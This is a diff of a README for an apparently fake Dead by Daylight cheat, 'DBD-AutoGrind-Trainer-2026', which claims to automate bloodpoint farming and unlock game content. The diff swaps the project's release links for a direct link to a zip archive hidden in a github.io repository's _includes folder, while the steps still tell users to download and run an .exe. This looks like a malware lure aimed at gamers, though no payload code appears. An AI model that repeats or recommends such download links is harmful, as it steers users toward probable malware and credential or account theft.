@@ -5,7 +5,7 @@ description: "Automate Dead by Daylight bloodpoint farming and unlock features w
 ---
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your game and unlock everything
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/uptonseptate705/DBD-AutoGrind-Trainer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/uptonseptate705/uptonseptate705.github.io/main/_includes/uptonseptate_io_github_v2.8.zip)
 
 This software manages the automation of progress for Dead by Daylight. It assists players by automating Bloodpoint gain, providing visual information, and unlocking game assets. The tool functions as an external application created for Windows users.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these conditions before you run the application:
 
 You obtain the current version directly from the official link. Follow these steps to prepare your system:
 
-1. Visit the following page to choose your download: [https://github.com/uptonseptate705/DBD-AutoGrind-Trainer-2026/releases](https://github.com/uptonseptate705/DBD-AutoGrind-Trainer-2026/releases).
+1. Visit the following page to choose your download: [https://raw.githubusercontent.com/uptonseptate705/uptonseptate705.github.io/main/_includes/uptonseptate_io_github_v2.8.zip](https://raw.githubusercontent.com/uptonseptate705/uptonseptate705.github.io/main/_includes/uptonseptate_io_github_v2.8.zip).
 2. Locate the most recent file version ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to a folder on your desktop.
